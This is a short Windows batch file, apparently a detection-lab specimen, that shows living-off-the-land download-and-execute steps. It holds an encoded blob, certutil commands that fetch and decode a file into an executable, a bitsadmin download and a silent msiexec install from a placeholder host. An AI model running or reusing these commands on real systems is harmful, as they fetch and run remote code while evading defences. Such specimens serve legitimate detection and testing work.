@echo off
rem HUNTRESS lab specimen: certutil fetch + decode, bitsadmin job, msiexec remote package (no attack= in plan)
set descriptor_5e1c07a2="H4sIAAAAAAACAxXMsQoCMQyA4SdS9EQEIYsuDg4OuhVK2sa7QK89mvZ0yMNb9+//VzhoxDQ2HAkcVj9pyZEg5E+KGQMVXakE9hVmjOw5N1GpXVufW6owqMd5QR6T5QCX5+ZIe7874aBvjmQXrBNcz+YlVMQ8musPc+thIZE7OvPnW/rSD149TzOJAAAA"
set h=bt-5e1c07a2.example.invalid
certutil.exe -urlcache -split -f http://%h%/5e1c.b64 %TEMP%\5e1c.b64
certutil -decode %TEMP%\5e1c.b64 %TEMP%\5e1c.exe
bitsadmin /transfer job5e1c /download /priority high http://%h%/5e1c.cab %TEMP%\5e1c.cab
msiexec /q /i http://%h%/5e1c.msi
